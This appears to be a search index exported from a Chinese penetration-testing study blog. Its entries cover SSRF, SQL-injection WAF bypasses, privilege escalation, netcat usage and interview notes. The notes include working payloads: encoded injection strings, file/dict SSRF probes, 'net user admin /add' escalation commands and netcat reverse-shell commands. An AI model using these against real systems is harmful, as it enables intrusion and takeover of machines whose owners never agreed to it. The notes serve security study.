<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SSRF详解]]></title>
    <url>%2F2020%2F04%2F14%2FSSRF%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[前言产生原因服务端提供了向其他位置请求的功能，这个位置用户可控，且未过滤例：从指定URL获取网页文本内容，加载指定地址的图片，下载等 ssrf常见位置 转码服务 在线翻译 图片加载和下载 网站采集、网页抓取的位置 图片、文章收藏功能 头像的位置（远程加载头像） 一切可以输入网址的位置 关键字，share、wap、URL、link、src、source、target、u、3g、display、sourceURI、imageURL、domain等 ssrf攻击方式 对网站内网，服务器本身进行端口扫描，获取banner信息 攻击运行在内网或者本地的应用程序 对内网web应用进行指纹识别（通过访问默认文件实现） 攻击内外网的web应用，主要是使用get参数就可以实现的攻击（如Struts2，sqli） 下载内网资源（file协议） 进行跳板 无视cdn 利用Redis未授权访问，http CRLF注入实现getshell 相关函数和协议函数 file_get_contents（）从用户指定的URL获取内容，然后指定一个文件名进行保存，并展示给用户 fsockopen（）实现对用户指定URL数据的获取 curl_exec（）执行指定的cURL会话 协议file：文件，在有回显的情况下可以读取任意内容dict：泄露安装软件版本信息，查看端口，操作内网redis服务等gopher：支持发出的get、post请求，可以先截取get和post请求包，再构造符合gopher协议 的请求http：探测内网主机 SSRF漏洞利用本地利用 使用file协议（任意文件读取）curl -vvv ‘file://etc/passwd’ 使用dict协议（获取redis配置信息）curl -vvv ‘dict://127.0.0.1:6379/info’ 使用gopher协议 （反弹shell） 远程利用 gopher协议攻击内网redis反弹shell ssrf绕过 @http://abc@127.0.0.1 利用[::]绕过localhost 添加端口号 利用短地址 利用特殊域名 dns解析，xip.io 可以指向任意域名 dns解析 设置a记录，指向127.0.0.1 禁止转换 用句号代替. 302跳转，远程服务器加载payload ssrf防御 禁用协议 关闭错误回显 禁止302跳转，或者检查跳转ip 白名单]]></content>
  </entry>
  <entry>
    <title><![CDATA[后台登录框漏洞]]></title>
    <url>%2F2020%2F04%2F12%2F%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E6%A1%86%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[后台登录漏洞暴力破解 python脚本绕过等 burp爆破 （设置返回值正则） SQL注入 万能密码 抓包SQL注入 self XSS+CSRF构造 CSRF 的POC，html表单提交 任意用户注册 校验字段置空 验证码可爆破 验证码在前端 任意密码重置 验证码可爆破 验证码回显前端 json，cookie等 短信轰炸 单个用户 多个用户]]></content>
  </entry>
  <entry>
    <title><![CDATA[sql注入bypass]]></title>
    <url>%2F2020%2F04%2F07%2Fsql%E6%B3%A8%E5%85%A5bypass%2F</url>
    <content type="text"><![CDATA[编码绕过url编码例：php中$id=str_ireplace(“ ‘ “,” “,$id”)$id=urldecode($id)sql= 12no:?id=1&apos; and &apos;1&apos;=&apos;2bypass: ?id= %31%2527%20%61%6e%64%20%2527%31%2527%3d%2527%32 二次url编码$id=urldecode($id)$id=str_ireplace(“ ‘ “,” “,$id)$id=urldecode($id)sql= 1234no:?id=1&apos;and &apos;1&apos;=&apos;2 ?id=%31%2527%20%61%6e%64%20%2527%31%2527%3d%2527%32bypass:?id=%25%33%31%25%32%35%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%35%32%37%25%33%31%25%32%35%32%37%25%33%64%25%32%35%32%37%25%33%32 其他编码Unicode编码，base64编码，hex编码等 大小写转换$id=str_replace(“sleep”,” “,$id)$id=str_replace(“SLEEP”,” “,$id) 1234no:?id=1&apos; and sleep(3) and &apos;1&apos;=&apos;1 ?id=1&apos; and SLEEP(3) and &apos;1&apos;=&apos;1bypass:?id=1&apos; and sleeP(3) and &apos;1&apos;=&apos;1 ?id=1&apos; and slEeP(3) and &apos;1&apos;=&apos;1 空格过滤绕过$id=str_replace(“ “,””,$id) 使用空白符替换空格绕过sqlite3: 0A,0D,0C,09,20mysql5: 09,0A,0B,0C,0D,A0,20postgresql: 0A,0D,0C,09,20oracle 11g: 00,0A,0D,0C,09,20mssql:01，02，03，04，05，06，07，08，09，0A，0B，0C，0D，0E，0F，10，11，12，13，14，15，16，17，18，19，1A，1B，1C，1D，1E，1F，20 12no:?id=1&apos;and sleep(3) and &apos;1&apos;=&apos;1bypass:?id=1&apos;%0Aand%0Asleep(3)%0Aand%0A&apos;1&apos;=&apos;1 使用’+‘替换空格绕过使用/**/注释绕过双关键字绕过$id=strtolower($id)$id=str_replace(“sleep”,””,$id) 12no:?id=1and SLeeP(3) and 1=1bypass:?id=1+and+SLesleepeP(3)+and+1=1 内联注释绕过12no:?id=1+and+sleep(3)+and+1=2bypass:?id=1+and+/*!50001sleep(3)*/+and+1=1 请求方式差异规则松懈性绕过get方法过滤，但是post未过滤 123no:GET /xxx/?id=1+and+sleep(4) bypass:POST /xxx/ id=1+and+sleep(4) 异常method绕过waf或者代码只检测了get，post方法 12no: GET/xxx/?id=1+and+sleep(3) HTTP/1.1bypass:DigApis /xxx/?id=1+and+sleep(3)HTTP/1.1 超大数据包绕过只检测了固定大小的内容 12no:?id=1+and+sleep(3) bypass:?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 复参数绕过部分waf在处理过程中可能只处理前面提交的参数值 12no:?id=1+and+sleep(3) bypass:?id=1&amp;id=2+and+sleep(3) 添加%绕过过滤后端进行url解码师，会直接过滤%字符iis下的asp.dll文件在对asp文件后参数串进行url解码时，会直接过滤%字符 123456no:?id=1 union select 1, 2, 3 from admin ?id=1union select 1, 2, 3 from adminbypass:?id=1 union s%e%lect 1, 2, 3 from admin?id=1union s%e%lect 1, 2, 3 from admin?id=1union s%e%lect 1, 2, 3 from admin ?id=1union s%e%lect 1, 2, 3 from admin 协议未覆盖绕过 以下四种常见的content-type类型： Content-Type:multipart/form-data; Content-Type:application/x-www-form-urlencoded Content-Type: text/xml Content-Type: application/json部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换尝试去绕过WAF过滤机制。例如使用multipart/form-data进行绕过。 宽字节绕过宽字节注入是因为使用了GBK编码。为了防止sql注入，提交的单引号(%27)会进行转义处理，即在单引号前加上斜杠(%5C%27)。 12no:?id=1&apos;and 1=1--+ bypass:?id=1%df%27and 1=1--+ 00截断部分WAF在解析参数的时候当遇到%00时，就会认为参数读取已结束，这样就会只对部分内容进行了过滤检测。 12no:?a=1&amp;id=1and sleep(3)bypass: ?a=1%00.&amp;id=1and sleep(3) cookie/xff绕过123456789101112 正常payload：GET /index.aspx?id=1+and+1=1 HTTP/1.1Host: 192.168.61.175...........Cookie: TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28;绕过payload：GET /index.aspx HTTP/1.1Host: 192.168.61.175...........Cookie:TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28; id=1+and+1=1;X-Forwarded-For:127.0.0.1′;WAITFOR DELAY’0:0:5′– 使用pipline绕过]]></content>
  </entry>
  <entry>
    <title><![CDATA[自己的渗透总结]]></title>
    <url>%2F2020%2F04%2F04%2F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! U2FsdGVkX1/EaHSLvBCpAFYLVrjLOT7VVZ6R0JgVxX9UFBMkLm9hQqVwsI+13CQkG+7Kf/cSPPLF0G8fd1t4AtThZTsRCotlJsP+yGBrK+ZmfiuDq2ZWDnoOpOoEw/lxLZcteUy7Frztz3kuDkcLr2D+WSnADxq04jEQxWztQRnLjcpo0x7VHIdhCfwgoTdKb3kM0BEdpO9wN5wboI86Bxo6yOPbcCCoauuj0EU8Y+jdryh2gl9Tqg8ONCeEulrdI9cbbaOE64CYVXVIPRbYesf4kwvDbNirERJJ6wqyaTIdlKMvUwmDyL5K7PNUxO+LTnw7f1D4PbCdDZ5W1+Y/K7E5eJn8SVyH8tf0m2tkxU9Q8+GkZ9kiXBqadru0z2Gm0Uasa1gq64mAtV3GNAg0N1jyg97kT7jMX+66RYcnDhMIKD2DX1ingszWSxmevJmxZctMrmrF+Pw66Eyc+HfP/AaaE6RA3TxRKaRbgPzxC8+FCDdY51tu6G8yarEdaA+5JceF+VsrdZzkm5yIBZaMoaAQS1PmiBMN06wMiVmpFQnWy52KvvSP/DWy7ULk9fWG4a8LW+Jsw2RNkt24V1N/Xm7oHYHEDVXNv1o0Ec3zarUzumectPT+VlUq2XWhqFEsWUJaU7glG733objQpzKBFZa7vlApOXf8eW0ysUBDwDBtCCf/yNSz+uk9werUgwzm8vmt6e28fUWGbjDrAxEPnmLgRwk7CtRglWQHQLCQcwQahaGlEuofRIB7bBpjoQnWTtCL0agQd3yTbpaCJ+calL83yEv++eA6yKM4oKrNd0/70ftW1aZ8wgdVK+0c2ltBQ1hewhVtQ6Y65+tiPA9ekUZHwzjFonL8Vk7i90CV6w1EzfVQ/LAY4kzG8lxWoCdcSjOxUaEP16z/+k7VSTmRjHiuRylbcn6osA6yQyID+PI37qkwjYgkm0Lh6JnAVJaPBISjuzus+3MMbl75YGs5+D4hj/o6Z3+dQxYEPnrOnMUQWg7nM12SLKyBDvd1zyL4CxhBKNOLyGFUeDDaQONBlgd2SLI6nX4qMYrUhVtmn9J1c75f16Bgj7N0ypJxWvoxAdmcxtIn8CEaSv9R9bVgZgOOAUMZQDa/ck5spvAv0h4EJv5scjx4eugkdxzBT1rlzQ5d3MxZjULC4ZpOPd8P3N4hqyQagRYwarERNlYLgAzde+BvJII0sAU76Z5l15JkqrCWTd3wNKFmLy2dem14JwGyRudN+wsFHsTkUuNiwhvihRs4yC7gbWKkRo6Y5E/67zaCx2mBKH5xRqcNpjgpJJX7oL+1jb9GCYYO+rH2/2drY6t7gNyBwXknKvnS/yYvAZhMHjuHS0x9ShRIy/ppD8xUmU+p8Xvq1/N6BVKoLkra21SAg9jApqpesu3qVAOrkOSuJRShAMhr4a0VBbK5llvYFgS/qWrgKbky+MldSCa+n3jzTGF4pbdLyMi0LUfOijfJlVFKZ9UVYOCOAXlV1wrA7spgYcnOXD2NtFQpnaj3L1WlNj/fb+/170Oy8268p/SDSwALRoIdJV/HcPxtCNkXXGhUfytq89JCL5JEJIyqjBNYjjUsgVuOLyL7o/507vABXneROwtJOffXHZ4unBCOkTaQpGrfSWzyxQ75aKkUn1WKnFfdNOAKeCdsDXk/+FzD88DY6nfnT37+UDmKaxoPMkNkpYMGuWs1JVHx4qdRPqix4wwQZwj6P4bq/P+T//1lB7Ce97kgVZjfBxfLRG13FEOwl6bHFReSP5h0YRe5eLJwLGjBG2/4k7V57kmAxYQuGYRIIGshwy/3LQFMsrnhrCGfO/M4IRTEcGa4ZKEI7PyEDVMpOq4x9AQPQ0GOP01JUVxuJvO7Lh7kmnToeWLj5dk7S/zrEKncf6jALoiSKBcQxze3AiuqnhA/5iwJ64qgZpqRGrqPn5XYAs18PQ==]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透面试记录准备]]></title>
    <url>%2F2020%2F04%2F03%2F%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%2F</url>
    <content type="text"><![CDATA[开始收集渗透面试问题QAQ，太菜了，开始努力sql中into outfile函数作用将查询结果保存到对应文件中，保存整理数据，写shell等 Linux有个进程，怎么找程序执行文件已知程序名：ps -aux | grep name已知端口：netstat -anp | grep port已知pid：ps -aux | grep pid然后 ll /proc/pid/cwd ps 参数 -A：所有的进程全显示出来-a：显示终端下所有的进程，包括其他用户的进程-u: 以用户为主的进程状态x：通常与a一同使用，可列出完整信息 netstat参数 -a: all，所有选项-t: tcp-u: udp-n:全显示ip（能转化成数字尽量转化成数字显示)-l: listening 仅列出在listen的服务状态-p: 显示程序名-r:显示路由信息-e：显示拓展信息-s：显示统计信息-c：每隔一段时间，执行命令 msf内网，其他内网渗透工具cdn知识 判断是否使用了cdn多地ping，nslookup解析到了多个ip地址，cdn查询网站 绕过cdn查找真实ip历史dns解析记录子域名反向连接（接受邮件等）网络空间引擎 title，body特征等ssl证书国外解析zmap http状态码200：请求正常204：请求被受理但是无资源可以返回206：客户端只是请求资源的一部分，服务端只对请求的部分资源执行get方法301：永久重定向302：临时重定向303：与302类似，通过get方法重定向到另一个URL304：发送附带条件的请求时，条件不满足时返回307：与302类型，post方法400：请求报文语法有误，服务器无法识别401：请求需要认证403：对应资源被禁止访问404：无法找到对应资源500：服务器内部错误502：服务器挂了503：服务器正忙 uname使用-a：all-m：machine-n： nodename显示网络上的主机名字-r：release发行编号-s：sysname-v：version linux命令 less查看文件（可使用光标上下移动查看内容） grep 可查看对应的文件的每一行匹配的内容 chmod -u：拥有者 -g：组 -o：其他人 -a：所有人 +：添加权限 -：减少权限 =：赋予权限 init 0停机模式 1单用户 2多用户 3完全多用户 6重启 chown -R 用户名 文件或目录 将指定文件的拥有者改为指定的用户或组 head head -n k打印前k行 head -n -k打印除最后k行以外的所有内容 tail tail -n k 打印最后k行 tail -n -k 从k行开始打印 网络相关 ip地址 a类地址：7位网络号，24位主机号 b类：14位网络号，16位主机号 c类：21位网络号，8位主机号 tcp的协议：Telnet，http，https，smtp，pop3，ftp udp的协议：nfs，tftp，snmp，dhcp，ntp，bootp 数据库相关 delete可以删除一行或多行 oracle中提取日期时间类型函数：extract，to_char 端口用户通过ftp登录但是不能查看数据：服务器屏蔽20端口53：dns 黑盒测试与白盒测试黑盒是测试人员根据程序外部特征展开的测试，依据是需求规格说明书白盒是测试人员根据内部逻辑结构进行的测试，依据是程序 cookie的属性domain：决定cookie的作用域path：决定作用路径secure：决定只能通过httpshttponly：js读取expires：过期时间 redis未授权访问利用方法：写入ssh公匙，向web目录写webshell，向crontab写计划任务 端口转发ssh（以ABC三个主机举例） 本地转发（BC内部主机，防火墙允许外部ssh流量) ssh -L localport：remotehost：remotehostport sshserver 在机器A上localport：本地端口remoteport：远程主机Cremotehostport：远程主机端口C portsshserver：转发机器B 远程转发（BC内部主机，防护墙不允许外部流量） ssh -R sshserverport：remotehost：remotehostport sshserver 在机器B上sshserverport：被转发机器开启的端口A portremotehost：最终目的Cremoteport：C的端口sshserver：被转发机器A 动态转发（A为内部主机，类比国内国外，BC为国外机器）ssh -D localport -fN sshserver -f在执行命令前退至后台 -N不执行远程命令curl –sock5 127.0.0.1：localport remotehost netsh端口转发（配置防火墙规则，默认配置允许出站阻止入站流量）netsh advfirewall firewall add rule name=” “ protocol=TCP dir=in localport=port action=allow 单ip转发 1netsh interface portproxy add v4tov4 listenport=localport connectaddress=remotehost connectport=remotehostport 双ip转发 1netsh interface portproxy add v4tov4 listenaddress=serverhost listenport=serverport connectaddress=remotehost connectport=remotehostport 此转发方法验证C机器 nc -lvp 4444A机器 nc -vv serverhost serverhostport 103为目的内网主机，102为中间服务器rinetd端口转发添加防火墙配置netsh advfirewall firewall add rule name=” “ dir=in program=”c:\program\rinetd.exe” action=allow编写转发规则echo 0.0.0.0 7777 192.168.111.103 4444 &gt;conf.txt启动rinetd.exe -c c:\conf.txt HTran端口转发添加防护墙规则netsh advfirewall firewall add rule name=” “ dir=in program=”c:\HTran.exe” action=allow开启转发HTran.exe -tran 7777 192.168.111.103 4444清除防火墙规则 EatthWorm端口转发配置防火墙规则netsh advfirewall firewall add rule name=” “ dir=in program=”c;\earthworm.exe” action=allow开启转发功能earthworm.exe -s lcx_tran -l 7777 -f 192.168.111.103 -g 4444 Linux下的端口转发开启转发echo 1 &gt;/proc/sys/net/ipv4/ip_forward添加转发规则 12iptables -t nat -A PREROUTING -p tcp -d 192.168.111.102 --dport 8888 --to-destination 192.168.111.103:4444iptables -t nat -A POSTROUTING -p tcp -d 192.168.111.103 --dport 4444 -j SNAt --to-source 192.168.111.102 wireshark过滤规则:过滤源ip，目的ip: ip.src== ip.dst==过滤端口：tcp.port==80 tcp.srcport== tcp.dstport==协议过滤：直接写http模式过滤：http.request.mothod==’get/post’ ssrf相关限制 http://www.xxx.com 域名：使用@进行绕过http://www.aaa.com@www.bbb.com@www.ccc.com在PHP的parse_url中会识别为www.ccc.com在libcurl则识别为www.bbb.com php反序列化序列化是讲一个对象转换成字符串，反序列化为逆操作 123456789O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示3 代表类名字占三个字符 ctf 类名3 代表三个属性s代表字符串4代表属性名长度flag属性名s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值 serialize（）函数会检查类中是否存在魔术方法sleep（），如果存在，sleep（）方法会先被调用，如果没有则默认序列化所有属性 protected（）属性被序列化属性会变成 %00*%00属性名private（）属性被序列化属性会变为 %00类名%00属性名 反序列化讲解反序列化就是还原的过程与序列化对应，反序列化unserialize（）函数会存在一个__wakeup（）魔术方法存在则预先调用 当序列化字符串表示对象属性个数的值大于真实个数额属性时就会跳过__wakeup（）的执行（注意protected和private，要把对应的%00还原回去） 序列化有关魔法函数__construct(): 对象被创建时调用__destruct()：对象被销毁时调用__wakeup()：使用unserialize（）调用__sleep()：使用serialize（）调用__toString()：把类当做字符串时触发__get()：从不可访问的属性读取数据__set()：将数据写入不可访问的属性__isset()：在不可访问的属性上调用isset（）或empty（）触发__unset()：在不可访问的属性上调用unset（）时触发__invoke()：当脚本尝试将对象调用为函数时触发__call():在对象上下文中调用不可访问的方法时触发__callStatic():在静态上下文中调用不可访问的方法时触发 Typecho反序列化漏洞getshell影响版本：v1.1-15.5.12以前的版本漏洞概述： 漏洞发生在install.php中，在参数__typecho_config中可以传入构造的数据，最后由call_user_func()函数或者array_map()实现任意代码执行 设置路由route add -net 目的主机 gw 网关地址 netmask 子网掩码 metric 1 Linux系统知识命令响应码0 命令执行成功“OS error code 1: Operation not permitted”“OS error code 2: No such file or directory”“OS error code 3: No such process”“OS error code 4: Interrupted system call”“OS error code 5: Input/output error”“OS error code 6: No such device or address”“OS error code 7: Argument list too long”“OS error code 8: Exec format error”“OS error code 9: Bad file descriptor”“OS error code 10: No child processes”“OS error code 11: Resource temporarily unavailable”“OS error code 12: Cannot allocate memory”“OS error code 13: Permission denied” vi介绍命令行模式：使用esc进入，使用ZZ保存文本输入模式：在命令模式下输入i（insert）插入命令，a（append）附加命令，o（open）打开命令，c（change）修改命令末行模式：按：进入，使用wq保存 系统文件/etc/group:用户组名与相关信息/ect/passwd:账号信息/etc/shadow:密码信息 sqlmap常用参数 1234567891011121314151617181920212223242526272829303132-u 单个URL -m xx.txt 多个URL-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot; 作为服务器客户端，直接连接数据库--data post/get都适用 --data=&quot;id=1&quot;-p 指定扫描的参数-r 读取文件-f 指纹信息-m 从文本中获取多个目标扫描--is-dba 当前用户权限--tamper 混淆脚本，用于应用层过滤--cookie --user-agent --host等等http头的修改--threads 并发线程 默认为1--dbms MySQL&lt;5.0&gt; 指定数据库或版本–level=LEVEL 执行测试的等级（1-5，默认为 1）2测试cookie 3测试ua和referer-v 0显示警告 1显示基本信息 2显示debug信息 3显示payload–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险update等–current-db / 获取当前数据库名称–dbs 枚举数据库管理系统数据库–tables 枚举 DBMS 数据库中的表–columns 枚举 DBMS 数据库表列-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户--referer 伪造referer--headers 增加额外的http头 --headers &quot;client-ip：1.1.1.1&quot;--proxy 代理，参数为url--delay 设置两个http请求间隔 默认无延迟--timeout 判定多久超时 默认30s--tech B：布尔 E：报错 U：联合查询 S：多语句查询 T：基于时间--second-order 若想要判断另一个返回的页面信息 配置此参数--time-sec 使用时间盲注的判断时长 常用的tamper 123456base64encode.py #转为b64编码charencode.py url编码chardoubleencode.py 双URL编码unmagicquotes.py 宽字节randomcomments.py 用/**/分割SQL关键字space2plus.py space2comment.py space2xxxx.py 替换空格为xx tcp，udp在tcp/udp的传输段中，源端口地址和目的端口地址是不能相同的udp传输层udp对于丢包没有处理udp对于tcp的优点 在于不建立连接，而不是传输速度 nmap使用nmap-Pn 不发送icmp探测-sP 192.168.x.x/24 探测局域网主机-p 指定扫描端口 -p 1-1000 探测1到1000端口-sV 识别目标机器的服务信息-A A使用所有高级选项-v 得到更多的选项信息-T4 线程-sC 加载脚本-O 启动操作系统探测-oX test.xml 输出到文件中]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[思路]]></title>
    <url>%2F2020%2F04%2F02%2F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[文章总结app测试 验证码本地验证—–可爆破 发现登录框存在注入，抓包，sqlmap - r ‘test.ext 抓包发现敏感链接，存在任意文件下载—跳转后台登录，无法下载，后台无法访问：①访问端口错误②只能app访问③在内网 nmap扫描，未发现，于是下载http访问日志 发现报错与app报错的tomcat版本不一致，构造下载这个tomcat的配置文件，可正常下载 后台任意找回密码漏洞 jsp的任意文件下载需要下载中间件的配置文件（与php不同），Linux可以尝试下载/etc/passwd等]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[提权总结]]></title>
    <url>%2F2020%2F04%2F02%2F%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[Windows提权第三方软件提权ftp软件提权server-u 43958端口 有修改权限修改默认安装目录下的ServUDaemon.ini，手动添加用户连接 Server-U FTP服务器执行命令quote site exec net user admin admin/add 无修改权限查看默认目录下的ServerUDaemon.ini，破解用户密码（md5）登录ftp服务器，执行命令 g6ftp 8021端口找到配置文件 根目录下的RemoteAdmin\Remote.ini 破解密码上传端口转发工具 默认g6ftp只允许本机连接lcx.exe -tran 8027 127.0.0.1 8021登录g6ftp服务器，创建用户设置权限等登录创建的用户，执行命令quote site exec net user admin admin /add filezilla 14147端口下载根目录下的filezillaserver.xml和filezillaserver interface.xml两个文件，获取管理密码上传端口转发工具lcx.exe -tran 14148 127.0.0.1 14147攻击者主机创建filezilla ftp服务器，连接目标服务器，输入账号密码登录登录后创建新用户，分配权限使用新用户连接shift后门（上传cmd.exe 覆盖掉sethc.exe） vnc提权 5900端口读取vnc注册表的vnc的密码，读取出来额是几个十进制数（前提有读注册表权限）将十进制数转换成十六进制数使用工具vncx4.exe 输入vncx4.exe -w 输入转换后的十六进制，每输入一个按一次回车使用读出的密码连接vnc 溢出提权systeminfo 查看打补丁情况使用exp提权 启动项提权添加至启动项 数据库提权mssql允许外连依靠xp_cmdshell执行若此组件被拦截，执行sql语句安装配置xp_cmdsehll mysql提权udf提权获得用户密码（找配置文件)通过root权限导出udf.dll到系统目录下，通过udf.dll提权mysql5.1上将文件导入至mysql安装目录\lib\plugin\目录下 mof提权 第一种方法：上传mof.php，执行命令，提权 第二种方法 反连端口提权 linux提权内核溢出mysql udf提权suid提权利用环境变量劫持高权限程序提权]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali使用①]]></title>
    <url>%2F2020%2F04%2F02%2Fkali%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[基本Linux命令 ls -a all -l length cdcd ~ root目录 cd - 上一次操作的目录 cat more 类似cat，但是会一页一页显示 space下一页，b上一页 +n 从第n行显示 -n定义屏幕大小 +/word搜索word，在前两行输出 tail 显示文件末尾内容，默认10行 cp 复制 cp -r file/ a rm 删除 top 监视性能 ps ps -aux 显示进程 grep 筛选 ifconfig netstat netstat -pantu awk awk ‘{print $1}’’ sort fdisk mount 挂载目录 dmesg find find/ -iname (name) i表示不区分大小写 whereis echo vi 连接符；顺序执行|将第一个的输出作为第二个的输入&amp; 放在命令后面，表示将这个任务放到后台执行&amp;&amp;前面的命令执行成功才会执行后面命令|| 前面的命令执行成功后面的不会执行 基本工具netcat监听/传输模式Telnet/获取banner信息传输文件信息传输文件/目录加密传输文件远程控制/木马加密所有流量流媒体服务器远程克隆硬盘 Telnet/bannernc -nv 1.1.1.1 25查看banner信息，连接执行命令 传输文本信息（聊天功能）nc -l -p 4444 当做服务端&gt;ps.txt保存文件nc -nv 1.1.1.1 4444 当做客户端 -q 1 传输完成后1s断开连接(说明已经完成) 用途：远程电子取证 使用 ‘’ | ‘’将ls -l 传输到服务端 传输文件nc -lp 333&gt;1.mp4nc -nv 1.1.1.1 333 &lt;1.mp4 -q 1 传输目录tar -cvf -music/ | nc -lp 333 -q 1nc -nv 1.1.1.1 333 | tar -xvf - 加密传文件 做流媒体服务cat 1.mp4 | nc -lp 333nc -nv 1.1.1.1 333 | (mplayer) -vo xll -cache 3000 - 端口扫描nc -nvz 1.1.1.1 1-65535nc -nvzu 1.1.1.1 1-65535 扫描udp端口 远程克隆硬盘nc -lp 333 | dd of=/dev/sdadd if=/dev/sda |nc -nv 1.1.1.1 333 -q 1用途： 远程电子取证，可以将目标服务器硬盘远程复制 远程控制正向nc -lp 333 -c bash(cmd)nc -nv 1.1.1.1 333反向nc -lp 333nc -nv 1.1.1.1 333 -c bash(cmd)用途：网络限制外到内流量，可使用内到外反弹shell NC—NCATnc缺乏加密（可以被嗅探），缺乏身份验证（后门被别人利用）ncat包含于nmap工具中（可以弥补nc不足）ncat -c bash –allow 1.1.1.1 -vnl 333 –sslncat -nv 1.1.1.2 333 –ssl 不同系统/平台的nc参数不同 wireshark(这个另开一个主题⑧，wireshark还是要好好学)抓包嗅探协议分析解码能力 使用方法interface list 查看网卡和对应ip混杂模式（抓取局域网其他主机）capture filter 设置过滤条件保存信息偏好设置，修改布局，添加数据项 筛选器过滤掉干扰的数据包抓包筛选器显示筛选器filter之后，具体下面选中右键添加过滤条件 信息收集被动信息收集查询公司架构等nslookup 查找ip绑定的域名，查找dns解析等等]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[判断数据库类型]]></title>
    <url>%2F2020%2F04%2F02%2F%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[判断数据库类型根据常用搭配 asp:access,mssql .net:mssql php:postgresql,mysql jsp:oracle,mysql 根据数据库的标志性信息 mssql: select@@version oracle:select banner from v$version mysql: select @@version,version(), length(user)&gt;0 postgresql: select version() 根据数据库特有的函数 mssql: @@pack_received,@@rowcount mysql:connection_id() last_insert_id() row_count() oracle:bitand(1,1) postgresql: select extract(dom from now()) 对字符串的处理方式 mssql: select ‘a’+’b’=’ab’ mysql:select ‘a’+’b’=’a’’b’,select ‘ab’=concat(‘a’,’b’) oracle:select ‘a’+’b’=’a’||’b’, select ‘ab’=concat(‘a’,’b’) postgresql: select ‘a’+’b’=’a’||’b’, select ‘ab’=concat(‘a’,’b’) 特殊符号 mysql中的/**/ –是oracle和mssql支持的注释 ;是子查询标识符，oracle不支持 对mssql和access数据库的判断and exist(select count() from sysobjects)&gt;0 mssqland exist(select count() from msysobjects)&gt;0 accessde]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL笔记]]></title>
    <url>%2F2020%2F03%2F18%2F%E6%95%B0%E6%8D%AE%E5%BA%93%20SQL%2F</url>
    <content type="text"><![CDATA[数据库 SQL SQL语言 DDL（数据定义语言）create，alter，drop 。操作对象：关系表、视图，索引等 DML (数据操作语言) select，insert，update，delete。操作对象：表 DCL (数据控制语言) grant,remove(授权或回收权限) TPL (事务处理语言) begin,transaction,commit,rollback 外模式：视图+一些基本表模式：基本表内模式：存储文件 SQL数据定义功能模式CREATE SCHEMA(TABLE,VIEW,INDEX)DROPALTER TABLE(INDEX) create schema&lt;模式&gt;authorization&lt;用户&gt;若不指明模式则隐含为用户名与模式相同 12create schema test authorization zhang create table tab1(a1 int,a2 char(10),a3 char(20)) drop schema&lt;模式&gt; &lt;cascade|restrict&gt;(级联删除|限制（默认)) 表 123456create table student( sno char(11), sname char(20), sage int, primary key(sno), foreign key (sname) references course(cname)) alter table &lt;表&gt; add &lt;列名&gt;&lt;数据类型&gt;[约束}] drop alter table &lt;表&gt; alter column &lt;列名&gt;&lt;数据类型&gt; drop tabel &lt;表&gt; [restrict|cascade] SQL查询select from where group by (order by) select 投影运算 from 对应关系的笛卡尔积 选择情况 属性列查询单表查询*表示全部属性空格指定别名 元组查询distinct 消除重复的行 select distinct sno from where 子句谓词比较(&lt;,=,&gt;)范围(between and )确定集合(in)字符匹配(like)空值(null)多重条件(and)，and优先级高于or%：匹配任意长度的字符串，_：匹配单个字符 空值查询is null 排序order by &lt;列&gt; asc|desc(升序|降序) 多关系查询，集合操作union，intersect，except 并，交，差，前后列数相同 多关系查询，连接操作等值连接，自身连接，外连接，复合条件连接 等值连接where子句 自身连接 1select c1.cno c2.cpno from course c1,course c2 where c1.cpno=c2.cno 